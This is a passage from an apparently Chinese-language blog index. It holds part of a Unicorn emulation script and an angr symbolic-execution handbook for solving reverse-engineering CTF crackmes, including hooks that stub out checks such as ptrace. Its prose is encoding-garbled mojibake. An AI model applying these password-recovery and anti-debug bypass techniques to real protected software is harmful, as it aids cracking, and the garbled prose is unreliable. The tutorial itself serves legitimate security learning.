åˆ©ç”¨retæ¥è·³è¿‡printfå‡½æ•°ï¼Œç±»ä¼¼è¿˜å¯ä»¥è·³è¿‡å…¶ä»–å‡½æ•°\n    if address == 0x640:  # printf\n        rsp = uc.reg_read(UC_X86_REG_RSP)\n        retn_addr = u64(uc.mem_read(rsp, 8))\n        uc.reg_write(UC_X86_REG_RIP, retn_addr)\n    # è·³è¿‡æŸæ¡æŒ‡ä»¤ï¼Œè¿™é‡Œè·³è¿‡mov rax,1æŒ‡ä»¤\n    CODE = uc.mem_read(address,7)\n    if CODE == asm('''mov rax,1'''):\n    #if CODE == b\"\\xb9\\x00\\x00\\x00\\x00\":\n        uc.reg_write(UC_X86_REG_RIP,address + 7)\n\n\ndef hook_code(mu, address, size, user_data):\n    print('>>> Tracing instruction at 0x%x, instruction size = 0x%x' %(address, size))\n\n\ndef initReg(uc, STACK_ADDRESS=0x7F00000000, RAX=0, RBX=0,\n            RCX=0, RDX=0, RSI=0,\n            RDI=0, R8=0, R9=0,\n            R10=0, R11=0, R12=0,\n            R13=0, R14=0, R15=0):\n    uc.reg_write(UC_X86_REG_RAX, RAX)\n    uc.reg_write(UC_X86_REG_RBX, RBX)\n    uc.reg_write(UC_X86_REG_RCX, RCX)\n    uc.reg_write(UC_X86_REG_RDX, RDX)\n    uc.reg_write(UC_X86_REG_RSI, RSI)\n    uc.reg_write(UC_X86_REG_RDI, RDI)\n    uc.reg_write(UC_X86_REG_R8, R8)\n    uc.reg_write(UC_X86_REG_R9, R9)\n    uc.reg_write(UC_X86_REG_R10, R10)\n    uc.reg_write(UC_X86_REG_R11, R11)\n    uc.reg_write(UC_X86_REG_R12, R12)\n    uc.reg_write(UC_X86_REG_R13, R13)\n    uc.reg_write(UC_X86_REG_R14, R14)\n    uc.reg_write(UC_X86_REG_R15, R15)\n    uc.reg_write(UC_X86_REG_RSP, STACK_ADDRESS + 0x100)\n    uc.reg_write(UC_X86_REG_RBP, STACK_ADDRESS + 0x200)\n\n\ndef initUC(uc, CODE_DATA,CODE_ADDRESS=0x40000,CODE_SIZE=2 * 1024 * 1024,\n           STACK_ADDRESS=0x7F00000000, STACK_SIZE=2 * 1024 * 1024):\n    # è·å–ä¸€å—å†…å­˜ç”¨æ¥ä¿å­˜ç¨‹åºçš„æ‰€æœ‰æ•°æ®\n    uc.mem_map(CODE_ADDRESS, CODE_SIZE, UC_PROT_ALL)\n    uc.mem_map(STACK_ADDRESS, STACK_SIZE, UC_PROT_ALL)\n    uc.mem_write(CODE_ADDRESS, CODE_DATA)\n\n\n\n#\".text\"/\".bss\"/\".got.plt\" å³å„æ®µåç§°\ndef getCODEFromBinary(binary,start = None,count=0x100):\n    elf = ELF(binary, checksec=False)\n    if(start == None):\n        with open(binary, \"rb\") as f:\n            CODE_DATA = f.read()\n        return CODE_DATA\n    elif( isinstance(start,str)):\n        start_addr = elf.get_section_by_name(start).header.sh_addr\n        count = elf.get_section_by_name(start).header.sh_size\n    else:\n        start_addr = start\n    CODE_DATA = elf.read(start_addr,count)\n    return CODE_DATA\n\n\n\nif __name__ == '__main__':\n    print(\"Emulate amd64 code\")\n    uc = Uc(UC_ARCH_X86, UC_MODE_64)\n    binary = \"/home/hacker/Desktop/test/note/note\"\n\n    CODE_ADDRESS = 0x400000\n    START_ADDRESS = CODE_ADDRESS + 0x0\n\n    CODE_DATA = asm('''\n    mov rax,1\n    mov rdx,1\n    mov rcx,1\n    ''')\n    #CODE_DATA = getCODEFromBinary(binary,\".text\")\n\n    # åˆå§‹åŒ–UC\n    initUC(uc, CODE_DATA,CODE_ADDRESS)\n    initReg(uc, RSI=0x20, RCX=0x40)\n\n    #éœ€è¦æ”¾åœ¨hookå‡½æ•°ä¹‹å‰\n    udbg = uniDbg.UnicornDebugger(uc)\n    udbg.add_bpt(START_ADDRESS)\n\n    # æ·»åŠ hook_OneStepå‡½æ•°ï¼Œä½¿å¾—CODE_ADDRESS~CODE_ADDRESS+len(CODE_DATA)ä¸­æ¯æ¡æŒ‡ä»¤æ‰§è¡Œæ—¶\n    # éƒ½è°ƒç”¨è¯¥hook_OneStepå‡½æ•°\n    uc.hook_add(UC_HOOK_CODE, hook_OneStep, None, START_ADDRESS,START_ADDRESS+len(CODE_DATA))\n\n    try:\n        # è¿è¡Œä¸€æ®µä»£ç \n        uc.emu_start(START_ADDRESS, START_ADDRESS + 0x30)\n    except UcError as e:\n        print(\"ERROR: %s\" % e)\n```\n","tags":["Unicorn"],"categories":["Reverse","Unicorn"]},{"title":"Angræ‰‹å†Œ","url":"/2021/11/19/Angræ‰‹å†Œ/","content":"\n# ä¸€ã€åˆå§‹åŒ–\n\n## â–²æ¨¡æ¿\n\n```python\nimport angr\nimport sys\nimport claripy\n\nfilePath = \"/home/hacker/Desktop/Reverse/Angr/AngrCTF_FITM/\"\n\n\ndef Go():\n    path_to_binary = filePath + \"./14_angr_shared_library/lib14_angr_shared_library.so\"\n\n    base = 0x4000000\n    project = angr.Project(path_to_binary, load_options={\n        'main_opts' : {'custom_base_addr' : base}\n    })\n    \n    buffer_pointer = claripy.BVV(0x3000000, 32)\n    \n    validate_function_address = base + 0x6d7\n    initial_state = project.factory.call_state(validate_function_address, buffer_pointer, claripy.BVV(8, 32))\n    \n    password = claripy.BVS('password', 8*8)\n    initial_state.memory.store(buffer_pointer, password)\n    \n    simulation = project.factory.simgr(initial_state)\n    \n    success_address = base + 0x783\n    simulation.explore(find=success_address)\n    \n    if simulation.found:\n        for i in simulation.found:\n            solution_state = i\n            solution_state.add_constraints(solution_state.regs.eax != 0)\n            solution = solution_state.solver.eval(password,cast_to=bytes)\n            print(\"[+] Success! Solution is: {0}\".format(solution))\n            #print(scanf0_solution, scanf1_solution)\n    else:\n        raise Exception('Could not find the solution')\n\nif __name__ == \"__main__\":\n    Go()\n```\n\n\n\n\n\n## 1.åˆ›å»ºProject\n\n```python\npath_to_binary = filePath + \"00_angr_find/00_angr_find\"\nproject = angr.Project(path_to_binary, auto_load_libs=False)\ninitial_state = project.factory.entry_state()\n#initial_state = project.factory.blank_state(addr=start_address)\nsimulation = project.factory.simgr(initial_state)\n```\n\n`auto_load_libs`ï¼šè¡¨æ˜¯å¦è½½å…¥ä¾èµ–åº“çš„å‡½æ•°ï¼Œlibcç­‰ï¼Œå¦‚æœä¸è½½å…¥ï¼Œè¿”å›çš„å€¼æ˜¯ä¸å¯çº¦æŸçš„ï¼Œä½†æ˜¯è½½å…¥å¯èƒ½ä¼šè·¯å¾„çˆ†ç‚¸ã€‚\n\n`initial_state`ï¼šå‘Šè¯‰angrä»å…¥å£å¤„å¼€å§‹ï¼Œæˆ–è€…ä»æŒ‡å®šçš„åœ°å€`start_address`å¼€å§‹ï¼Œä¸è¿‡è¿™æ ·ä¸€èˆ¬éœ€è¦è®¾ç½®ä¸€ä¸‹å¯„å­˜å™¨ã€‚\n\n`simulation`ï¼šè·å–æˆ‘ä»¬æ“ä½œçš„å¯¹è±¡ï¼Œä¹‹åçš„æ“ä½œå³å¯¹è¿™ä¸ªå¯¹è±¡è¿›è¡Œæ“ä½œã€‚\n\n\n\n## 2.è®¾ç½®æ¢ç´¢è·¯å¾„\n\n### (1)è®¾ç½®çº¦æŸè·¯å¾„\n\n#### â‘ é€šè¿‡åœ°å€è®¾ç½®\n\n```python\nprint_good_address = 0x8048678\navoid_me_address = 0x080485A8\n```\n\nè¡¨å¦‚æœç¨‹åºåˆ°è¾¾`print_good_address`ï¼Œå³ä»£è¡¨æˆåŠŸè§£é¢˜ï¼Œä¸€èˆ¬é¢˜ä¸­å°±æ˜¯è¾“å‡ºflagçš„åœ°å€ã€‚\n\n`avoid_me_address`åˆ™ç”¨åœ¨éœ€è¦é¿å…åˆ°è¾¾çš„åœ°æ–¹\n\n#### â‘¡é€šè¿‡æ‰“å°å†…å®¹è®¾ç½®\n\n```python\ndef is_successful(state):\n    stdout_output = state.posix.dumps(sys.stdout.fileno())\n    if b'Good Job.' in stdout_output:\n        return True\n    else: \n        return False\n    \ndef should_abort(state):\n    stdout_output = state.posix.dumps(sys.stdout.fileno())\n    if b'Try again.' in  stdout_output:\n        return True\n    else: \n        return False    \n```\n\nå½“ç¨‹åºä¸­æœ‰å¤šä¸ªæ­£ç¡®è¾“å‡ºçš„æ—¶å€™ï¼Œè·å–ç¨‹åºè¾“å‡ºï¼Œå¦‚æœè¾“å‡ºä¸­åŒ…å«æ ‡å¿—æ€§çš„ç¬¦å·`Good Job`ï¼Œåˆ™ä»£è¡¨æˆåŠŸåˆ°è¾¾ï¼Œæˆ–è€…è®¾ç½®å…¶ä»–çš„æ ‡å¿—æ€§ç¬¦å·ã€‚æˆ–è€…å½“ç¨‹åºä¸­æœ‰å¤šä¸ªç›¸åŒçš„é”™è¯¯è¾“å‡ºçš„æ—¶å€™ï¼Œè·å–ç¨‹åºè¾“å‡ºï¼Œå¦‚æœè¾“å‡ºä¸­åŒ…å«æ ‡å¿—æ€§çš„ç¬¦å·`Try Again`ï¼Œåˆ™ä»£è¡¨åº”è¯¥éœ€è¦é¿å…çš„åœ°æ–¹ï¼Œè€Œä¸ç”¨è¾“å…¥å¤šä¸ªåœ°å€ã€‚\n\n#### â‘¢è®¾ç½®å‘é‡\n\nä¸€èˆ¬è€Œè¨€ï¼Œå¯èƒ½è¾“å…¥çš„é•¿åº¦æˆ–è€…å­—ç¬¦æœ‰äº›é™åˆ¶ï¼Œæ¯”å¦‚scanfçš„æ ¼å¼åŒ–è·å–è¾“å…¥ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å‘é‡ç”Ÿæˆé™åˆ¶æ€§çš„è¾“å…¥å­—ç¬¦ï¼Œç¼©å°æœç´¢è·¯å¾„\n\n```python\nimport claripy\npasswd_size_in_bits = 32\npasswd0 = claripy.BVS('passwd0', passwd_size_in_bits)\npasswd1 = claripy.BVS('passwd1', passwd_size_in_bits)\npasswd2 = claripy.BVS('passwd2', passwd_size_in_bits)\n```\n\nè®¾ç½®äº†ä¸‰ä¸ªå‘é‡ï¼Œé•¿åº¦ä¸º32bit\n\n`BVS()`ï¼šä»£è¡¨ä½å‘é‡åˆ›å»º\n\n`FPS()`ï¼šä»£è¡¨ç¬¦å·å‘é‡åˆ›å»º\n\n#### â‘£è®¾ç½®å¯„å­˜å™¨\n\nå½“ç¨‹åºæœ‰æ—¶å€™ä¸éœ€è¦ä»å¤´å¼€å§‹ï¼Œè€Œæ˜¯åªæµ‹è¯•æŸä¸ªåœ°æ–¹æˆ–è€…åœ¨æŸä¸ªåœ°æ–¹éœ€è¦æ›´æ”¹å¯„å­˜å™¨æ—¶ï¼Œå¯ä»¥è¿›è¡Œè®¾ç½®\n\n```python\n#initial_state = project.factory.blank_state(addr=start_address)\ninitial_state.regs.eax = passwd0\ninitial_state.regs.ebx = passwd1\ninitial_state.regs.edx = passwd2\n```\n\n#### â‘¤è®¾ç½®æ ˆä¸Šçš„æ•°æ®\n\n##### A.å…ˆè®¾ç½®æ ˆå¸§æŒ‡é’ˆ\n\n```python\n#initial_state = project.factory.blank_state(addr=start_address)\ninitial_state.regs.ebp = initial_state.regs.esp *#EBP=ESP*\n```\n\n##### B.è§‚å¯Ÿæ ˆä¸Šæ•°æ®ï¼Œç„¶åè¿›è¡Œè®¾ç½®\n\næ¯”å¦‚å¦‚ä¸‹æƒ…å½¢ï¼Œéœ€è¦0x8çš„æ ˆç©ºé—´\n\n![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211129153552.png)\n\né‚£ä¹ˆå…ˆå°†espæ”¾åˆ°ebp-0x8çš„ä½ç½®\n\n```python\n#initial_state = project.factory.blank_state(addr=start_address)\npadding_length_in_bytes = 0x08\ninitial_state.regs.esp -= padding_length_in_bytes\n```\n\nç„¶åè®¾ç½®å‘é‡ï¼Œå‹å…¥æ ˆä¸­\n\n```python\n#initial_state = project.factory.blank_state(addr=start_address)\npasswd0 = claripy.BVS('var_10', 32) #s1\npasswd1 = claripy.BVS('var_C', 32) #s2\n#var_10åªä»£è¡¨name\n\ninitial_state.stack_push(passwd0) \ninitial_state.stack_push(passwd1)\n```\n\nè¿™æ ·å³å¯å®Œæˆæ ˆä¸­æ•°æ®çš„å¸ƒç½®\n\n##### ğŸ”ºæ³¨ï¼š\n\nè¿™é‡Œç¬¦å·åŒ–æ ˆä¸Šæ•°æ®æ—¶ï¼Œåªèƒ½ä¸€ä¸ªä¸€ä¸ªpushï¼Œå³32ä½ä¸€æ¬¡pushè¿›4å­—èŠ‚ï¼Œ64ä½ä¸€æ¬¡pushè¿›8å­—èŠ‚ï¼Œä¸èƒ½å¤šï¼Œä¸ç„¶ä¼šé€ æˆç¬¦å·æˆªæ–­ã€‚è¿™é‡Œå…¶å®å¯ä»¥ç›´æ¥é€šè¿‡è·å–rspï¼Œç„¶ååˆ©ç”¨rspæ¥åŠ è½½æ•°æ®å³å¯ã€‚\n\n```python\ninitial_state.regs.rsp = initial_state.regs.rbp\nbuf_addr = initial_state.regs.rsp - 0x10\npasswd0 = claripy.BVS('password', 0x8 * 8)\ninitial_state.memory.store(buf_addr, passwd0)\n```\n\n\n\n#### â‘¥ç¬¦å·åŒ–å†…å­˜\n\nå¯»å€éœ€è¦ç¬¦å·åŒ–çš„å†…å­˜åœ°å€ï¼Œå¦‚ä¸‹ï¼š\n\n![image-20211129163056788](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211129163056.png)\n\nå³ç¬¦å·åŒ–å››ä¸ªå…«å­—èŠ‚é•¿åº¦çš„user_input\n\n```python\npasswd_size_in_bits = 64\npasswd0 = claripy.BVS('passwd0', passwd_size_in_bits)\npasswd1 = claripy.BVS('passwd1', passwd_size_in_bits)\npasswd2 = claripy.BVS('passwd2', passwd_size_in_bits)\npasswd3 = claripy.BVS('passwd3', passwd_size_in_bits)\n\n#initial_state = project.factory.blank_state(addr=start_address)\npasswd0_address = 0xA1BA1C0\n#passwd1_address = 0xA1BA1C8\n#passwd2_address = 0xA1BA1D0\n#passwd3_address = 0xA1BA1D8\ninitial_state.memory.store(passwd0_address, passwd0)\ninitial_state.memory.store(passwd0_address + 0x8,  passwd1)\ninitial_state.memory.store(passwd0_address + 0x10, passwd2)\ninitial_state.memory.store(passwd0_address + 0x18, passwd3)\n```\n\n#### â‘¦ç¬¦å·åŒ–å †å†…å­˜\n\nå³åœ¨buffer0å’Œbuffer1ä¸­ä¿å­˜çš„æ˜¯mallocå‡ºæ¥çš„å†…å­˜æŒ‡é’ˆ\n\n\n\n![image-20211129164136483](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211129164136.png)\n\n![image-20211129164213775](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211129164213.png)\n\nè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å‘è¿™ä¸¤ä¸ªbufä¸­å†™å…¥å†…å­˜åœ°å€ï¼Œç„¶åæŠŠéœ€è¦ç¬¦å·åŒ–çš„å†…å­˜å†™å…¥åˆ°å¯¹åº”çš„å†…å­˜åœ°å€ä¸­ï¼Œè¿™é‡Œé€‰å–çš„å†…å­˜åœ°å€è®¾ç½®ä¸º\n\n```python\nfake_heap_address0 = 0xffffc93c\nfake_heap_address1 = 0xffffc94c\n```\n\næœ€ç»ˆå¦‚ä¸‹è®¾ç½®\n\n```python\n#initial_state = project.factory.blank_state(addr=start_address)\nfake_heap_address0 = 0xffffc93c\npointer_to_malloc_memory_address0 = 0xabcc8a4\nfake_heap_address1 = 0xffffc94c\npointer_to_malloc_memory_address1 = 0xabcc8ac\ninitial_state.memory.store(pointer_to_malloc_memory_address0, fake_heap_address0, endness=project.arch.memory_endness)\ninitial_state.memory.store(pointer_to_malloc_memory_address1, fake_heap_address1, endness=project.arch.memory_endness)\n\ninitial_state.memory.store(fake_heap_address0, passwd0)  \ninitial_state.memory.store(fake_heap_address1, passwd1)\n```\n\n#### â‘§ç¬¦å·åŒ–æ–‡ä»¶\n\n```python\nfilename = 'OJKSQYDP.txt'\n#64ä¸ªå­—èŠ‚\nsymbolic_file_size_bytes = 64\n#åˆ›å»ºæ–‡ä»¶å‘é‡\npasswd0 = claripy.BVS('password', symbolic_file_size_bytes * 8)\npasswd_file = angr.storage.SimFile(filename, content=passwd0, size=symbolic_file_size_bytes)\n\n\n#initial_state = project.factory.blank_state(addr=start_address)\n#å°†æ–‡ä»¶å‘é‡æ’å…¥\ninitial_state.fs.insert(filename, passwd_file)\n```\n\n\n\n\n\n\n\n## 3.çº¦æŸæ¯”è¾ƒå‡½æ•°\n\nå½“åœ¨å¾ªç¯é‡Œè¿›è¡Œæ¯”è¾ƒåˆ¤æ–­æ˜¯ï¼Œä¼šäº§ç”Ÿå¾ˆå¤šåˆ†æ”¯\n\n```c\n_BOOL4 __cdecl check(int a1, unsigned int a2)\n{\n  int v3; // [esp+8h] [ebp-8h]\n  unsigned int i; // [esp+Ch] [ebp-4h]\n  v3 = 0;\n  for ( i = 0; i < a2; ++i )\n  {\n    if ( *(_BYTE *)(i + a1) == *(_BYTE *)(i + 0x804A040) )\n      ++v3;\n  }\n  return v3 == a2;\n}\n```\n\nè¿™é‡Œçš„a2=16ï¼Œå³å°†16ä¸ªå­—ç¬¦éƒ½æ‹¿å‡ºæ¥é€ä¸ªæ¯”è¾ƒï¼Œæ¯æ¬¡æ¯”è¾ƒäº§ç”Ÿä¸¤ä¸ªåˆ†æ”¯ï¼Œ16æ¬¡æ¯”è¾ƒå°±ä¼šäº§ç”Ÿ2^16=65536ä¸ªåˆ†æ”¯ï¼Œä¼šä½¿å¾—åˆ†æ”¯å˜å¾—å¾ˆå¤§ï¼Œä½†æ˜¯è¿™é‡Œå…¶å®åªæ˜¯ä¸€ä¸ªæ¯”è¾ƒå‡½æ•°ï¼Œä¿è¯a1ä»£è¡¨å­—ç¬¦ä¸²çš„å†…å®¹å’Œ`0x804A040`ä¸­ä¿å­˜çš„å­—ç¬¦ä¸²å†…å®¹ç›¸ç­‰å°±å¯ä»¥äº†ï¼Œè¿™é‡Œå°±å¯ä»¥è¿è¡Œåˆ°è¯¥å‡½æ•°ä¹‹å‰ï¼Œç„¶åè‡ªå·±è·å–å¯¹åº”å†…å­˜ä¸­å€¼è¿›è¡Œæ¯”è¾ƒï¼Œæ·»åŠ é™åˆ¶å³å¯ã€‚\n\n```python\n#initial_state = project.factory.blank_state(addr=start_address)\n\n#buff_addrä¸­ä¿å­˜çš„å³ä¸ºæˆ‘ä»¬è¿è¡Œåˆ°æ¯”è¾ƒå‡½æ•°ä¹‹å‰å¾—åˆ°çš„å­—ç¬¦ä¸²ï¼Œä½¿ä¹‹ä¸0x804A040ä¸­çš„å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒ\nbuff_addr = 0x0804A050\naddress_to_check_constraint = 0x08048565\nsimulation = project.factory.simgr(initial_state)\n#æ¢ç´¢è·¯å¾„åˆ°è¿›å…¥æ¯”è¾ƒå‡½æ•°ä¹‹å‰\nsimulation.explore(find=address_to_check_constraint)\nif simulation.found:\n    solution_state = simulation.found[0]\n    constrained_parameter_address = buff_addr\n    constrained_parameter_size_bytes = 16\n    constrained_parameter_bitvector = solution_state.memory.load(constrained_parameter_address,constrained_parameter_size_bytes)\n\n\n#0x804A040ä¸­ä¿å­˜çš„å³ä¸º\"AUPDNNPROEZRJWKB\"\nconstrained_parameter_desired_value = 'AUPDNNPROEZRJWKB'\n\n#æ¯”è¾ƒçº¦æŸï¼Œè·å¾—ä½¿ä¸¤å€¼ç›¸ç­‰çš„ç¬¦å·é‡\nsolution_state.solver.add(constrained_parameter_bitvector == constrained_parameter_desired_value)\n\n#å¾—åˆ°æœ€ç»ˆè§£\nsolution0 = solution_state.solver.eval(passwd0,cast_to=bytes)\n```\n\n\n\n## 4.ä½¿ç”¨HOOKå‡½æ•°\n\n### (1)åˆ©ç”¨åœ°å€è¿›è¡Œhook\n\nå³ç”¨è‡ªå·±ç¼–å†™çš„å‡½æ•°æ›¿ä»£ç¨‹åºä¸­çš„å‡½æ•°æ¥æ‰§è¡Œï¼Œå‡è®¾è¿™é‡Œæƒ³hookæ‰ä»¥ä¸‹å‡½æ•°ï¼Œè¯¥å‡½æ•°å³ä¸ºä¹‹å‰çš„æ¯”è¾ƒå‡½æ•°check\n\n![image-20211129172222733](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211129172222.png)\n\né‚£ä¹ˆçœ‹å­—èŠ‚ç å¯çŸ¥å¯¹åº”çš„å‡½æ•°ä¸º5ä¸ªå­—èŠ‚ï¼Œåœ°å€ä¸º`0x80486B3`\n\n```python\ncheck_equals_called_address = 0x80486B3\ninstruction_to_skip_length = 5\n\n#ä»¥ä¸‹æ˜¯ä¸€ä¸ªæ•´ä½“\n#åˆ©ç”¨hookå‡½æ•°è¿›è¡Œæ›¿æ¢\n@project.hook(check_equals_called_address, length=instruction_to_skip_length)\ndef skip_check_equals_(state):\n    #å‡½æ•°çš„è¾“å…¥å‚æ•°\n    user_input_buffer_address = 0x804A054\n    user_input_buffer_length = 16\n    user_input_string = state.memory.load(\n        user_input_buffer_address,\n        user_input_buffer_length,\n        endness=archinfo.Endness.LE\n    )\n    #ä¸€èˆ¬éƒ½æ˜¯å°ç«¯ï¼Œå¤§ç«¯:BE\n\n    #éœ€è¦æ¯”è¾ƒçš„å­—ç¬¦ä¸²\n    check_against_string = 'XKSPZSJKJYQCQXZV'\n\n    #è®¾ç½®è¿”å›çš„å¯„å­˜å™¨ï¼Œåªè¿”å›ç»™äº†eaxå¯„å­˜å™¨ï¼Œæ‰€ä»¥åªéœ€è¦è®¾ç½®eaxå¯„å­˜å™¨\n    register_size_bit = 32\n    state.regs.eax = claripy.If(\n        user_input_string == check_against_string,\n        claripy.BVV(1, register_size_bit),\n        claripy.BVV(0, register_size_bit)\n    )\n```\n\n### (2)åˆ©ç”¨å‡½æ•°åè¿›è¡Œhook\n\nå½“å‡½æ•°è¢«è°ƒç”¨äº†å¤šæ¬¡ï¼Œè€Œæˆ‘ä»¬åˆéœ€è¦å¯¹æ¯ä¸€ä¸ªè¿™ä¸ªå‡½æ•°è¿›è¡Œhookæ—¶ï¼Œå°±å¯ä»¥é€šè¿‡å‡½æ•°åè¿›è¡Œhook\n\n```c\n_BOOL4 __cdecl check_equals_ORSDDWXHZURJRBDH(char *to_check, unsigned int length)\n{\n  int v3; // [esp+8h] [ebp-8h]\n  unsigned int i; // [esp+Ch] [ebp-4h]\n\n  v3 = 0;\n  for ( i = 0; i < length; ++i )\n  {\n    if ( to_check[i] == *(_BYTE *)(i + 0x804C048) )\n      ++v3;\n  }\n  return v3 == length;\n}\n```\n\næ¯”å¦‚æ›¿æ¢ä¸Šè¿°çš„å‡½æ•°\n\n```python\nclass ReplacementCheckEquals(angr.SimProcedure):\n    def run(self, to_check, length):\n        #ç¬¬ä¸€ä¸ªå‚æ•°\n        user_input_buffer_address = to_check\n        #ç¬¬äºŒä¸ªå‚æ•°\n        user_input_buffer_length = length\n        \n        #ä¾æ®å‚æ•°è·å–è¾“å…¥çš„å­—ç¬¦ä¸²\n        user_input_string = self.state.memory.load(\n            user_input_buffer_address,\n            user_input_buffer_length)\n        \n        #æ‰§è¡Œæ¯”è¾ƒåŠŸèƒ½å¹¶è¿”å›\n        check_against_string = 'ORSDDWXHZURJRBDH'\n        return claripy.If(\n            user_input_string == check_against_string,\n            claripy.BVV(1, 32),\n            claripy.BVV(0, 32))\n\ncheck_equals_symbol = 'check_equals_ORSDDWXHZURJRBDH'\nproject.hook_symbol(check_equals_symbol, ReplacementCheckEquals())\n```\n\nä¸»è¦å°±æ˜¯å®šä¹‰ä¸€ä¸ªç±»ï¼Œå°†æ‰€æœ‰å‡½æ•°åç§°ä¸ºcheck_equals_ORSDDWXHZURJRBDHçš„å‡½æ•°ç”¨ç±»ReplacementCheckEqualsä¸­çš„runå‡½æ•°æ›¿æ¢\n\n### (3)Hookæ‰Scanfå‡½æ•°\n\n```python\nclass ReplacementScanf(angr.SimProcedure):\n    def run(self, format_string, param0, param1):\n        \n        #è®¾ç½®è¦å­˜å…¥å¯¹åº”å‚æ•°å†…å­˜ä¸­çš„æ•°æ®\n        scanf0 = claripy.BVS('scanf0', 32)\n        scanf1 = claripy.BVS('scanf1', 32)\n\n        #è·å–éœ€è¦å­˜å…¥çš„å†…å­˜åœ°å€ï¼Œç„¶åä»¥ç¬¦å·å‘é‡çš„å½¢å¼å­˜å‚¨è¿›å»\n        scanf0_address = param0\n        self.state.memory.store(scanf0_address, scanf0, endness=project.arch.memory_endness)\n        scanf1_address = param1\n        self.state.memory.store(scanf1_address, scanf1, endness=project.arch.memory_endness)\n\n        #å°†ä¸¤ä¸ªå‘é‡æ•°æ®è®¾ç½®ä¸ºå…¨å±€çš„ï¼Œæ–¹ä¾¿ä¹‹åæ±‚è§£æ‰“å°\n        self.state.globals['solutions'] = (scanf0, scanf1)\nscanf_symbol = '__isoc99_scanf'\n\nproject.hook_symbol(scanf_symbol, ReplacementScanf())\n```\n\n### (4)Hooké™æ€åº“å‡½æ•°\n\nå½“ç¨‹åºä½¿ç”¨é™æ€ç¼–è¯‘æ—¶ï¼Œå¯èƒ½éœ€è¦Hookä¸€äº›é™æ€åº“å‡½æ•°\n\nåœ¨æ¢ç´¢å¼€å§‹ä¹‹å‰æ·»åŠ å³å¯\n\n```python\nproject.hook(0x804ed40, angr.SIM_PROCEDURES['libc']['printf']())\nproject.hook(0x804ed80, angr.SIM_PROCEDURES['libc']['scanf']())\nproject.hook(0x804f350, angr.SIM_PROCEDURES['libc']['puts']())\nproject.hook(0x8048d10, angr.SIM_PROCEDURES['glibc']['__libc_start_main']())\n```\n\n### (5)å¤„ç†å‡½æ•°åœ¨å¤–éƒ¨åº“soä¸­\n\nå½“ç¨‹åºå¯¹äºflagçš„åŠ è§£å¯†å¤„ç†å‡½æ•°åœ¨å¤–éƒ¨åº“ä¸­æ—¶ï¼Œè¿™æ—¶å€™å¯ä»¥ç›´æ¥è°ƒç”¨å¤–éƒ¨åº“ä¸­çš„å‡½æ•°è¿›è¡Œç¬¦å·æ‰§è¡Œ\n\n```python\n#å› ä¸ºåº“å‡½æ•°åŠ¨æ€åŠ è½½ï¼Œæ‰€ä»¥éœ€è¦æŒ‡å®šåç§»\nbase = 0x4000000\nproject = angr.Project(path_to_binary, load_options={\n    'main_opts' : {'custom_base_addr' : base}\n})\n\n#ä¸ºè¾“å…¥å‚æ•°åˆ›å»ºå†…å­˜å‘é‡çš„åœ°å€\nbuffer_pointer = claripy.BVV(0x3000000, 32)\n\n#è®¾ç½®éœ€è¦è°ƒç”¨çš„å‡½æ•°åœ°å€\nvalidate_function_address = base + 0x6d7\n#è®¾ç½®çŠ¶æ€ï¼Œè°ƒç”¨å‡½æ•°\ninitial_state = project.factory.call_state(validate_function_address, buffer_pointer, claripy.BVV(8, 32))\n\n#è£…è½½å†…å­˜å‘é‡è¿›å…¥åœ°å€æŒ‡é’ˆä¸­\npassword = claripy.BVS('password', 8*8)\ninitial_state.memory.store(buffer_pointer, password)\n```\n\n`main_opts`ä¸ºä¸»ç¨‹åºæŒ‡å®šåŠ è½½å‚æ•°ï¼Œå¸¸ç”¨ä»¥ä¸‹å‚æ•°\n\n- custom_base_addr â€”â€” ä½¿ç”¨çš„åŸºåœ°å€\n- custom_entry_point â€”â€” ä½¿ç”¨çš„å…¥å£ç‚¹\n- custom_arch â€”â€” ä½¿ç”¨çš„å¤„ç†å™¨ä½“ç³»ç»“æ„çš„åå­—\n\nè¿™æ ·åœ¨ä¹‹åçš„è®¾ç½®æˆåŠŸåœ°å€ä¹Ÿéœ€è¦ç”¨åˆ°`base`\n\n```python\nsuccess_address = base + 0x783\n```\n\n### (6)å¿«é€Ÿhook\n\n```python\ndef hook_Normal(state):\n    state.regs.rax = 8\np.hook(0x40168e, hook_Normal, length=5)\n\n#æˆ–è€…\np.hook_symbol('ptrace', angr.SIM_PROCEDURES['stubs']['ReturnUnconstrained'](return_value=0))\n\n#ç›´æ¥pass\ndef patch_0(state):\n    pass\n```\n\n\n\n## 5.å¼€å§‹æ¢ç´¢\n\n```python\nsimulation.explore(find=is_successful, avoid=should_abort)\n```\n\n`simulation.explore`è¡¨å¼€å§‹æ¢ç´¢ï¼Œè¯•å›¾è¿›å…¥åˆ°`print_good_address`ä¸­\n\n\n\n### â–²veritestingæ¨¡å¼\n\nè¯¥æ¨¡å¼å¯ä»¥å¯¹è·¯å¾„çˆ†ç‚¸è¿›è¡Œä¸€äº›è§£å†³\n\nhttps://www.anquanke.com/post/id/251984\n\nä½†æ˜¯åœ¨éœ€è¦æ¢ç´¢æ‰€æœ‰è·¯å¾„çš„æ—¶å€™ï¼Œveritestingä¼šå‡ºé”™ï¼Œå°†ä¸€äº›è·¯å¾„åˆå¹¶ï¼Œä»è€Œæ— æ³•æŠµè¾¾æ­£ç¡®çš„deadendè·¯å¾„ï¼Œè¯¦è§`csaw_wyvern/wyvern`\n\n```python\nsimulation = project.factory.simgr(initial_state, veritesting=True)\n```\n\n\n\n## 6.è¾“å‡ºç­”æ¡ˆ\n\n### (1)ç¬¦å·è¾“å‡º\n\n```python\nif simulation.found:\n    solution_state = simulation.found[0]\n    solution = solution_state.posix.dumps(sys.stdin.fileno())\n    print(\"[+] Success! Solution is: {}\".format(solution.decode(\"utf-8\")))\nelse:\n    raise Exception('Could not find the solution')\n```\n\nå³è·å–æ‰¾åˆ°çš„ç¬¬ä¸€ä¸²ç¬¦å·ï¼Œç„¶åè¾“å‡º\n\n### 